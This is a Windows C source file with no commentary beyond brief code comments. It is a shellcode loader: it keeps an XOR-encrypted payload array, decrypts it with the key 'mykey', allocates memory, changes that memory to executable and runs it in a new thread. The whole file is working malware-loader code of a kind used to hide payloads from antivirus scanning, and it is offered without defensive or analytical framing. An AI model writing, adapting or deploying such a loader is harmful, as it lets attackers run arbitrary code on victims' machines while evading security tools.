#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

void XOR(char *data, size_t data_sz, char *key, size_t key_sz)
{
	// in-place 
	int i, j;  
	
	for (i = 0, j = 0; i < data_sz; i++, j++) {
		if (j == key_sz - 1)
			j = 0; 
		data[i] = data[i] ^ key[j]; 
	}
}

int main(void)
{
	void *exec_mem; 
	
	unsigned char payload[] = {0x91, 0x31, 0xe8, 0x81, 0x89, 0x85, 0xb9, 0x6b, 0x65, 0x79, 0x2c, 0x28, 0x2a, 0x35, 0x2b, 0x3c, 0x2f, 0x23, 0x54, 0xab, 0x8, 0x31, 0xe0, 0x37, 0x19, 0x25, 0xf2, 0x39, 0x7d, 0x31, 0xe6, 0x2b, 0x4b, 0x2d, 0xf2, 0x1f, 0x29, 0x23, 0x6a, 0xce, 0x27, 0x33, 0x26, 0x54, 0xb0, 0x25, 0x48, 0xab, 0xc9, 0x45, 0xc, 0x5, 0x69, 0x49, 0x59, 0x2c, 0xb8, 0xa2, 0x68, 0x38, 0x6c, 0xb8, 0x89, 0x88, 0x2b, 0x2c, 0x28, 0x23, 0xee, 0x2b, 0x4d, 0xf2, 0x29, 0x59, 0x31, 0x6c, 0xa9, 0xe0, 0xe5, 0xf1, 0x6d, 0x79, 0x6b, 0x2d, 0xfc, 0xad, 0xd, 0xc, 0x2d, 0x78, 0xbd, 0x29, 0xe0, 0x2d, 0x61, 0x29, 0xf2, 0x2b, 0x45, 0x30, 0x6c, 0xa9, 0x88, 0x33, 0x31, 0x92, 0xb0, 0x2a, 0xee, 0x4d, 0xe5, 0x31, 0x6a, 0xb3, 0x34, 0x5c, 0xb0, 0x23, 0x54, 0xb9, 0xc1, 0x38, 0xaa, 0xac, 0x74, 0x2c, 0x78, 0xaa, 0x5d, 0x99, 0x18, 0x88, 0x27, 0x66, 0x35, 0x49, 0x71, 0x2e, 0x5c, 0xa8, 0x18, 0xa1, 0x33, 0x21, 0xf2, 0x2d, 0x5d, 0x22, 0x64, 0xa9, 0xb, 0x38, 0xe0, 0x69, 0x31, 0x29, 0xf2, 0x2b, 0x79, 0x30, 0x6c, 0xa9, 0x2a, 0xee, 0x7d, 0xe5, 0x31, 0x6a, 0xb5, 0x38, 0x35, 0x38, 0x33, 0x3b, 0x20, 0x37, 0x38, 0x33, 0x24, 0x20, 0x2c, 0x23, 0x23, 0xe6, 0x95, 0x4d, 0x38, 0x39, 0x9a, 0x99, 0x35, 0x38, 0x32, 0x3f, 0x31, 0xe6, 0x6b, 0x82, 0x32, 0x86, 0x92, 0x86, 0x36, 0x2d, 0xc3, 0x6c, 0x79, 0x6b, 0x65, 0x79, 0x6d, 0x79, 0x6b, 0x2d, 0xf4, 0xe0, 0x78, 0x6a, 0x65, 0x79, 0x2c, 0xc3, 0x5a, 0xee, 0x16, 0xea, 0x86, 0xbe, 0xde, 0x89, 0xd8, 0xdb, 0x3d, 0x24, 0xc3, 0xcb, 0xec, 0xd6, 0xf8, 0x86, 0xb8, 0x31, 0xe8, 0xa1, 0x51, 0x51, 0x7f, 0x17, 0x6f, 0xf9, 0x96, 0x99, 0x1e, 0x60, 0xc2, 0x2a, 0x6a, 0x19, 0xa, 0x13, 0x6d, 0x20, 0x2a, 0xec, 0xa3, 0x92, 0xac, 0x8, 0x4, 0x15, 0xe, 0x57, 0xe, 0x1d, 0x1c, 0x6d};
	unsigned int payload_sz = sizeof(payload); 
	char key[] = "mykey"; 
	
	// allocate memory for payload
	// address, size, type, protection 
	exec_mem = VirtualAlloc(0, payload_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	
	// decrypt the payload: ciphertext and key 
	XOR((char *) payload, payload_sz, key, sizeof(key)); 
	
	// copy the payload into memory 
	RtlMoveMemory(exec_mem, payload, payload_sz); 
	
	// make memory executable 
	DWORD old = 0; 
	BOOL rv = VirtualProtect(exec_mem, payload_sz, PAGE_EXECUTE_READ, &old); 

	// launch the payload 
	// attr, stack size, addr, param, flags, thread id
	if (rv != 0) {
		HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); 
		WaitForSingleObject(th, -1); 
	}
	
	return 0; 
}